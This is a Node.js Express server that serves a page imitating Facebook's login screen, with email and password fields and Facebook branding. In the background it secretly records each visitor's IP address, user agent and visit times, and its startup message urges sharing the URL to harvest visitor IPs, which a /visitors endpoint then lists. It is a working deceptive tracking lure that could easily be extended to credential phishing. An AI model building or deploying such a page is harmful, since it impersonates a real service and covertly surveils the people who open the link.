const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Store unique visitors and their information
const visitors = new Map();
let totalVisits = 0;

// Root endpoint (handles http://localhost:3000/)
app.get('/', (req, res) => {
    // Get the IP address from various possible headers
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               req.connection.socket.remoteAddress;
    
    // Get additional information
    const userAgent = req.headers['user-agent'];
    const timestamp = new Date().toISOString();
    
    // Update visitor count
    totalVisits++;
    if (!visitors.has(ip)) {
        visitors.set(ip, {
            firstVisit: timestamp,
            lastVisit: timestamp,
            visits: 1,
            userAgent: userAgent
        });
    } else {
        const visitor = visitors.get(ip);
        visitor.lastVisit = timestamp;
        visitor.visits++;
    }
    
    // Create a more visible log message
    console.log('\n=========================================');
    console.log(`🕒 Time: ${timestamp}`);
    console.log(`🌐 IP Address: ${ip}`);
    console.log(`🖥️ User Agent: ${userAgent}`);
    console.log(`👥 Total Unique Visitors: ${visitors.size}`);
    console.log(`📊 Total Visits: ${totalVisits}`);
    console.log('=========================================\n');
    
    res.send(`
        <html>
            <head>
                <title>Facebook - log in or sign up</title>
                <style>
                    * {
                        margin: 0;
                        padding: 0;
                        box-sizing: border-box;
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                    }

                    body {
                        background-color: #f0f2f5;
                    }

                    .container {
                        max-width: 1200px;
                        margin: 0 auto;
                        padding: 20px;
                        display: flex;
                        align-items: center;
                        justify-content: space-between;
                        height: 100vh;
                    }

                    .left-section {
                        flex: 1;
                        padding-right: 32px;
                    }

                    .logo {
                        color: #1877f2;
                        font-size: 60px;
                        font-weight: bold;
                        margin-bottom: 16px;
                    }

                    .tagline {
                        font-size: 28px;
                        line-height: 32px;
                        color: #1c1e21;
                    }

                    .right-section {
                        flex: 1;
                    }

                    .login-box {
                        background-color: white;
                        padding: 20px;
                        border-radius: 8px;
                        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
                        max-width: 396px;
                    }

                    .input-field {
                        width: 100%;
                        padding: 14px 16px;
                        border: 1px solid #dddfe2;
                        border-radius: 6px;
                        margin-bottom: 12px;
                        font-size: 17px;
                    }

                    .login-button {
                        background-color: #1877f2;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        font-size: 20px;
                        font-weight: bold;
                        padding: 14px 16px;
                        width: 100%;
                        cursor: pointer;
                        margin-bottom: 16px;
                    }

                    .login-button:hover {
                        background-color: #166fe5;
                    }

                    .forgot-password {
                        text-align: center;
                        margin-bottom: 20px;
                    }

                    .forgot-password a {
                        color: #1877f2;
                        text-decoration: none;
                        font-size: 14px;
                    }

                    .divider {
                        border-bottom: 1px solid #dadde1;
                        margin: 20px 0;
                    }

                    .create-account {
                        background-color: #42b72a;
                        color: white;
                        border: none;
                        border-radius: 6px;
                        font-size: 17px;
                        font-weight: bold;
                        padding: 14px 16px;
                        width: 100%;
                        cursor: pointer;
                    }

                    .create-account:hover {
                        background-color: #36a420;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="left-section">
                        <div class="logo">facebook</div>
                        <div class="tagline">Facebook helps you connect and share with the people in your life.</div>
                    </div>
                    <div class="right-section">
                        <div class="login-box">
                            <input type="text" class="input-field" placeholder="Email address or phone number">
                            <input type="password" class="input-field" placeholder="Password">
                            <button class="login-button" onclick="window.location.href='https://www.facebook.com/login'">Log In</button>
                            <div class="forgot-password">
                                <a href="https://www.facebook.com/login/identify">Forgotten password?</a>
                            </div>
                            <div class="divider"></div>
                            <button class="create-account">Create New Account</button>
                        </div>
                    </div>
                </div>
            </body>
        </html>
    `);
});

// API endpoint to capture and return the client's IP address
app.get('/ip', (req, res) => {
    const clientIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0];
    res.json({ ip: clientIp });
});

// Add a new endpoint to see all visitors
app.get('/visitors', (req, res) => {
    const visitorList = Array.from(visitors.entries()).map(([ip, data]) => ({
        ip,
        firstVisit: data.firstVisit,
        lastVisit: data.lastVisit,
        visits: data.visits,
        userAgent: data.userAgent
    }));
    
    res.json({
        totalVisitors: visitors.size,
        totalVisits: totalVisits,
        visitors: visitorList
    });
});

// Start the server
app.listen(port, () => {
    console.log('\n🚀 Server is running and ready to log IP addresses');
    console.log(`📡 Share this URL to see visitor IPs in the logs`);
    console.log(`📊 Visit /visitors to see all visitor data\n`);
});